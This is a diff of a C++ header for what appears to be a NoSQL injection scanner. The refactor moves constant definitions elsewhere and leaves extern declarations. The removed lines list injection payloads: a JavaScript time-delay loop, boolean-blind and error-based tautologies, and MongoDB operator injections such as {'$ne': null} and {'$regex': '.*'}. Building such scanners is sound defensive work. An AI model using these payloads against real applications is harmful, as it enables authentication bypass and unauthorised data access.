@@ -4,46 +4,15 @@
 #include <vector>
 
 namespace Constants {
-const double AnomalySimilarityThreshold = 85.0;
+extern const double AnomalySimilarityThreshold;
 
-const std::vector<std::string> Escapes = {"'", "\"", "`", ""};
+extern const std::vector<std::string> Escapes;
 
-const std::vector<std::string> Suffixes = {" //", " /*"};
+extern const std::vector<std::string> Suffixes;
 
-// For Time Blind (Format string, {} will be replaced with delay in ms)
-// Note: JS curly braces are escaped as {{ and }} for std::format
-const std::vector<std::string> TimeDelays = {
-    " || (function(){{ var d = new Date().getTime(); while(new "
-    "Date().getTime() < d + {}){{}} return true; }})()"};
+extern const std::vector<std::string> TimeDelays;
 
-// For Boolean Blind (True vs False statements)
-const std::vector<std::pair<std::string, std::string>> BooleanBlinds = {
-    // Converted from previous tautologies
-    {" || false", " || true"},
-    {" || 1==2", " || 1==1"},
-    {" || 'a'=='b'", " || 'a'=='a'"},
-    {" || 1==='1'", " || 1=='1'"},
-    {" || typeof 1 === 'string'", " || typeof 1 === 'number'"},
+extern const std::vector<std::pair<std::string, std::string>> BooleanBlinds;
 
-    // 3. Error-Based Blinds (False condition crashes the server, True executes
-    // safely)
-    {" || (function(){throw new Error();})()", " || true"},
-    {" || nonexistent_variable_123", " || true"},
-    {" || (function(){var a = null; return a.b;})()", " || true"}};
-
-// For Operator Injection (Category 2)
-const std::vector<std::string> OperatorInjections = {
-    // Inequality & Comparisons
-    R"({"$ne": null})", R"({"$ne": ""})", R"({"$gt": ""})",
-
-    // Regex (matches everything)
-    R"({"$regex": ".*"})",
-
-    // Arrays
-    R"({"$nin": []})", R"({"$nin": [""]})",
-
-    // Type matching
-    R"({"$type": 2})" // Match any string
-};
-
+extern const std::vector<std::string> OperatorInjections;
 } // namespace Constants
